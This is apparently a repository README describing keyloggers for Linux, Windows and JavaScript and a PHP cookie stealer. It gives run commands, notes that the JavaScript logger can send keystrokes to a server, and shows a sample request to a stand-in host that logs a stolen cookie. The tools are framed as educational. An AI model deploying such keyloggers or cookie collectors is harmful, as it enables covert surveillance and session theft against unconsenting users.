<h2 align='center'>Keyloggers</h2>
<p>The keyloggers are designed to capture keystrokes and log activity on different operating systems. Please note that these are the first versions and will be refined and enhanced over time. These keyloggers designed for educational and ethical purposes.
<ol>
  <h3><li>Linux Keylogger</h3>
    <ul>
      <li><b>Description:</b> This keylogger is specifically designed for Linux environments. It listens to keyboard events through the /dev/input devices and logs keystrokes to a file. The keylogger can also detect active processes using xdotool if available
      <li><b>Features:</b>
        <ul>
          <li>Captures and logs keystrokes directly from input devices
          <li>Supports the mapping of key codes to human-readable characters
          <li>Writes logs to a file for easy review and analysis
          <li>Requires root privileges for access to input devices
        </ul>
      <li><b>Run</b> the keylogger with root permissions:
            <pre><code>sudo python linux_keylogger.py</code></pre>
    </ul>
    <h3><li>Windows Keylogger</h3>
      <ul>
        <li><b>Description:</b> The Windows version of the keylogger leverages the Windows API and <code>psutil</code> library to capture active window information, process details, and keystrokes. It logs all activities into a file for analysis
        <li><b>Features:</b>
          <ul>
            <li>Captures and logs keystrokes using the Windows API
            <li>Retrieves active window and process information for detailed logging
            <li>Supports keyboard layout detection for accurate log representation
            <li>Outputs logs to a file with detailed information about the active application and layout
          </ul>
              <li><b>Run</b> the keylogger:
                <pre><code>python windows_keylogger.py</code></pre>
      </ul>
      <h3><li>JavaScript Keylogger</h3>
            <ul>
        <li><b>Description:</b> It logs keypress events, including standard characters, special function keys (e.g., Esc, Enter, Backspace), and modifier keys (Shift, Ctrl, Alt). The keylogger also captures key combinations to provide more comprehensive data. The                   project showcases JavaScript's event handling capabilities, which could be useful in understanding how keylogging works
        <li><b>Features:</b>
          <ul>
            <li>Logs Regular Keys: Captures standard keyboard characters, including letters, numbers, and symbols
            <li>Detects Modifier Keys: Recognizes Shift, Ctrl, Alt, and Meta (Windows/Command) keys and includes them in the log
            <li>Records Special Function Keys: Handles function keys (Esc, Backspace, Delete, Enter, Caps Lock, Tab, and arrow keys)
            <li>Key Combination Logging: Logs combinations like Ctrl + C, Shift + A, or Alt + Enter
            <li>Optional Server Communication: Allows sending logged key data to a server endpoint (e.g., for remote analysis)
          </ul>
              <li><b>How to use:</b>
                <ul><li>Place the JavaScript file containing the keylogger code into an HTML file, or link it via a &lt;script> tag</ul>
</ol>
<h2 align='center'>Cookie Stealer (.php)</h2>
              <li><b>Description:</b> This project is a simple PHP script that captures and logs cookies sent via URL parameters. The script is intended for educational and ethical purposes, such as security research and demonstration of cookie handling in web                           applications. It logs any <code>cookie</code> parameter passed through a GET request to a local file named <code>stolen_cookies.txt</code> in the same directory. Each log entry is timestamped for easy reference.
              <li><b>Warning:</b> This script should only be used in controlled environments and with permission. Unauthorized use of this tool to capture cookies is illegal and unethical.
              <li><b>How It Works:</b>
                <ol>
                  <li>The script checks for a URL parameter named <code>cookie</code>
                  <li>If <code>cookie</code> is present, its value is saved to a file <code>stolen_cookies.txt</code> along with the current timestamp
                  <li>If the parameter is missing, the script simply returns a message saying "No cookie"
                </ol>
              <li><b>Example:</b>
                To log a cookie with a value of example_cookie_value, make a GET request like this:
                <pre><code>http://your-server.com/cookie-stealer.php?cookie=example_cookie_value</code></pre>
<h2 align='center'>Future Improvements:</h2>
<ul>
  <li><b>Security Enhancements:</b> Aim to make the keyloggers more robust and add encryption to protect the captured logs
  <li><b>Additional Platforms:</b> Support for macOS and possible improvements to cross-platform functionality
  <li><b>Process Tracking:</b> Improvements in tracking processes and window changes in Linux, similar to the Windows version
  <li><b>Customization:</b> Providing more customizable settings, such as changing the log file location, log formatting, and more
</ul>
